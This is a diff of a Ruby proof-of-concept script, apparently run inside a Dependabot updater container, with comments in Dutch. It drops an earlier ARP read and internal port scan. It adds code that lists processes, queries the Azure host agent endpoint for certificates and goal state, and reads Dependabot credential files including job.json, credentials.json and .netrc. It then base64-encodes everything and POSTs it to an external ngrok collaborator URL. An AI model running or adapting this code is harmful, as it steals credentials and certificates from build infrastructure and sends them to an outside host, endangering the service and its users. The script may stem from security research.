@@ -2,42 +2,49 @@ COLLAB_URL = "https://95a1-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app
 
 begin
   require "net/http"
-  require "socket"
   require "uri"
 
   results = []
 
-  # ARP table - welke hosts heeft de container gezien
-  ["/proc/net/arp", "/proc/1/net/arp"].each do |f|
-    results << "=== #{f} ===\n#{File.read(f)}" rescue nil
+  # Process listing - zijn andere jobs zichtbaar?
+  pids = Dir.entries("/proc").select { |e| e =~ /^\d+$/ }.map(&:to_i).sort
+  results << "=== /proc PIDs (#{pids.length}) ===\n#{pids.join(' ')}"
+
+  pids.first(50).each do |pid|
+    begin
+      cmdline = File.read("/proc/#{pid}/cmdline").gsub("\x00", " ").strip
+      next if cmdline.empty?
+      results << "[#{pid}] #{cmdline[0..200]}"
+    rescue; end
   end
 
-  # TCP verbindingen
-  ["/proc/net/tcp", "/proc/net/tcp6"].each do |f|
-    results << "=== #{f} ===\n#{File.read(f)}" rescue nil
-  end
-
-  # Network interfaces
-  results << "=== /proc/net/fib_trie ===\n#{File.read('/proc/net/fib_trie')[0..3000]}" rescue nil
-  results << "=== /proc/net/if_inet6 ===\n#{File.read('/proc/net/if_inet6')}" rescue nil
-
-  # Scan 10.x.x.1 gateways (Kubernetes / Azure VNet)
-  ["10.0.0.1", "10.0.0.2", "10.96.0.1", "10.244.0.1", "10.240.0.1"].each do |ip|
-    [443, 80, 22, 6443].each do |port|
-      begin
-        s = TCPSocket.new(ip, port)
-        s.close
-        results << "=== #{ip}:#{port} OPEN ==="
-      rescue Errno::ECONNREFUSED
-        results << "=== #{ip}:#{port} REFUSED ==="
-      rescue => e
-        results << "=== #{ip}:#{port} #{e.class} ==="
-      end
+  # HGAP /certificates en /goalstate via directe HTTP (niet via proxy)
+  ["certificates", "goalstate"].each do |endpoint|
+    begin
+      uri = URI("http://168.63.129.16:32526/#{endpoint}")
+      req = Net::HTTP::Get.new(uri)
+      resp = Net::HTTP.start(uri.host, uri.port, open_timeout: 5, read_timeout: 5) { |h| h.request(req) }
+      results << "=== HGAP /#{endpoint} HTTP #{resp.code} ===\n#{resp.body[0..4000]}"
+    rescue => e
+      results << "=== HGAP /#{endpoint} ERR: #{e.class}: #{e.message} ==="
     end
   end
 
-  payload = [results.compact.join("\n\n")].pack("m0")
-  post_uri = URI("#{COLLAB_URL}?poc=arp-scan")
+  # Credentials file locations
+  [
+    "/home/dependabot/dependabot-updater/job.json",
+    "/home/dependabot/dependabot-updater/credentials.json",
+    "/home/dependabot/.netrc",
+    "/etc/dependabot/credentials",
+  ].each do |path|
+    begin
+      content = File.read(path)
+      results << "=== #{path} ===\n#{content[0..3000]}"
+    rescue; end
+  end
+
+  payload = [results.join("\n\n")].pack("m0")
+  post_uri = URI("#{COLLAB_URL}?poc=procs-hgap")
   r = Net::HTTP::Post.new(post_uri)
   r.body = payload
   Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: post_uri.scheme == "https",
